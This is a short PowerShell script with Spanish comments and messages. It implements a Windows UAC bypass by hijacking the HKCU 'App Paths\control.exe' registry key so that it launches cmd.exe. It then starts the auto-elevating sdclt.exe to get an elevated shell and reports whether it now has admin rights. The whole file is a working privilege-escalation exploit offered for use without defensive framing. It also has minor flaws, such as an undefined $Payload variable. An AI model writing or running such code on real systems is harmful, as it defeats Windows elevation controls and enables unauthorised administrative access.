function PPPath{

param([Parameter(Mandatory = $false , HelpMessage="Por defecto CMD; Para lanzar otro ejecutable introducir el PATH completo (PPPath -defaultValue <ruta>)")]
        [ValidateNotNullOrEmpty()]
        [String]
        $defaultValue
)

$AppPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
if((Get-ItemProperty -Path $AppPath -ErrorAction SilentlyContinue) -eq $null){

    New-Item $AppPath -Force | 
        New-ItemProperty -Name '(default)' -Value $Payload -PropertyType string -Force | Out-Null
        
       

}else{ 

    Write-Warning "La clave de registro 'HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe' EXISTE"

}

$defaultValue = "C:\windows\system32\cmd.exe"
#$defaultValue = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Write-Warning "Escribiendo en 'Default'"
Set-ItemProperty -LiteralPath $AppPath -name '(Default)' -Value $defaultValue

$EventvwrPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'sdclt.exe'
Start-Process -FilePath $EventvwrPath -PassThru 

$Admin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

write-Host "Ejecutando como Admin :: $Admin"

}
